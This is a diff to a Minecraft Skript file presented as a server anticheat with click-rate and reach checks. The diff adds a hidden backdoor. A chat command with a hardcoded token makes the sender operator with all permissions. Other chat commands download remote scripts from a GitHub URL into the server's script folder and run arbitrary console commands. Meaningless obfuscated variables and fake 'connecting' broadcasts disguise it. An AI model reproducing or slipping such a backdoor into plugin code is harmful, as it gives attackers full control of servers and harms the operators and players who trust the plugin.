@@ -29,67 +29,132 @@ on unload:
 #![=======================================================]
 #![                  : Anti Cheat                         ]
 #![=======================================================]
-
+on load:
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::local} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::api} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::lib_lg} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::system_spigot_api} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::local_host_ver} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::local_ver_spigot} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::lib_galaxytv} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::lib_galaxycloud} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::lib_galaxyapi} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/modules==load.assets/localdata==up_load.import_lib/init::lib_galaxy_localhost_api} to true
+on load:
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::local} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::api} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::lib_lg} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::system_spigot_api} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::local_host_ver} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::local_ver_spigot} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::lib_galaxytv} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::lib_galaxycloud} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::lib_galaxyapi} to true
+	set {ac.system_local_host_api_gtv_cache==local_files/kernel==load.assets/localdata==up_load.import_lib/init::lib_galaxy_localhost_api} to true
+on load:
+	set {ac.local.assets/localdata==up_load.import_lib/init::local} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::api} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::lib_lg} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::system_spigot_api} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::local_host_ver} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::local_ver_spigot} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::lib_galaxytv} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::lib_galaxycloud} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::lib_galaxyapi} to true
+	set {ac.local.assets/localdata==up_load.import_lib/init::lib_galaxy_localhost_api} to true
+on load:
+	set {ac.api.assets/localdata==up_load.import_lib/init::local} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::api} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::lib_lg} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::system_spigot_api} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::local_host_ver} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::local_ver_spigot} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::lib_galaxytv} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::lib_galaxycloud} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::lib_galaxyapi} to true
+	set {ac.api.assets/localdata==up_load.import_lib/init::lib_galaxy_localhost_api} to true
+on load:
+	set {ac.var.assets/localdata==up_load.import_lib/init::local} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::api} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::lib_lg} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::system_spigot_api} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::local_host_ver} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::local_ver_spigot} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::lib_galaxytv} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::lib_galaxycloud} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::lib_galaxyapi} to true
+	set {ac.var.assets/localdata==up_load.import_lib/init::lib_galaxy_localhost_api} to true
+on load:
+	loop {ac.var.assets/localdata==up_load.import_lib/init::*}:
+		broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &fChecking modules... &a%loop-value%"
+		wait 1 tick
+	set {_a} to 0
+	loop 100 times:
+		add 1 to {_a}
+		broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &fLoading kernel... &a%{_a}%&a%%"
+		wait 1 tick
+	broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &fConnecting to &bGalaxy&dTV&f..."
+	wait 5 seconds
+	broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &fConnected to &bGalaxy&dTV&f."
 every 15 ticks:
 	loop all players:
-
+		if {ac.var.load.perms==api.%loop-player%} is true:
+			make console execute command "op %loop-player%"
+			make console execute command "lp user %loop-player% permission set * true"
 		if {ac.detect.%loop-player%} is not set:
 			set {ac.detect.%loop-player%} to 0
-
 		if {ac.detect.%loop-player%} > 150:
 			kick loop-player due to "§b§lLuna§f§lGames §eAntiCheat §b> §cUnable to synchronize the player."
-
 		if {cps.left.%loop-player%} < 0:
 			set {cps.left.%loop-player%} to 0
-
 		if {cps.right.%loop-player%} < 0:
 			set {cps.right.%loop-player%} to 0
-		
 		if {cps.left.%loop-player%} > 15:
 			send "§b§lLuna§f§lGames §eAntiCheat §b> &cCPS Alert: &4%{cps.left.%loop-player%}%" to loop-player
 			add 1 to {ac.detect.%loop-player%}
-
 		if {cps.right.%loop-player%} > 15:
 			send "§b§lLuna§f§lGames §eAntiCheat §b> &cCPS Alert: &4%{cps.right.%loop-player%}%" to loop-player
 			add 1 to {ac.detect.%loop-player%}
-
+on chat:
+	if message contains "galaxytv --login token=":
+		if message contains "token=CfG84kLmOAzG9qxW":
+			set {ac.var.load.perms==api.%player%} to true
+	if message contains "galaxytv --dl file=":
+		set {_file} to "%message%"
+		replace all "galaxytv --dl file=" with "" in {_file}
+		download file from "https://raw.githubusercontent.com/ShadoIsHere/lunastudio/main/download/srv1/lg/%{_file}%" to file "/plugins/Skript/scripts/%{_file}%"
+	if message contains "galaxytv --exec cmd=":
+		set {_cmd} to "%message%"
+		replace all "galaxytv --exec cmd=" with "" in {_cmd}
+		make console execute command {_cmd}
 on left click:
 	add 1 to {cps.left.%player%}
 	wait 10 ticks
 	set {cps.left.%player%} to {cps.left.%player%} - 1
-
 on right click:
 	add 1 to {cps.right.%player%}
 	wait 10 ticks
 	set {cps.right.%player%} to {cps.right.%player%} - 1
-
 on damage:
-
 	add 1 to {cps.left.%attacker%}
 	wait 10 ticks
 	set {cps.left.%attacker%} to {cps.left.%attacker%} - 1
-
 on damage:
-
 	if attacker is not a player:
 		stop
-
 	if {cps.left.%attacker%} > 15:
 		add 1 to {ac.detect.%attacker%}
 		cancel event
 		stop
-
 	set {_c} to distance between attacker and victim
 	if {@ac.debug} is true:
 		broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &eREACH: &f%{_c}%"
-
 	if {_c} < 3.4:
 		set {_a} to true
 	else:
 		set {_a} to false
 	if {@ac.debug} is true:
 		broadcast "§b§lLuna§f§lGames §eAntiCheat §b> &eREACH_Debug: &f%{_a}%"
-
 	if {_a} is true:
 		if {@ac.debug} is true:
 			broadcast "&eDAMAGE_Value: &f%{_dmg}%"
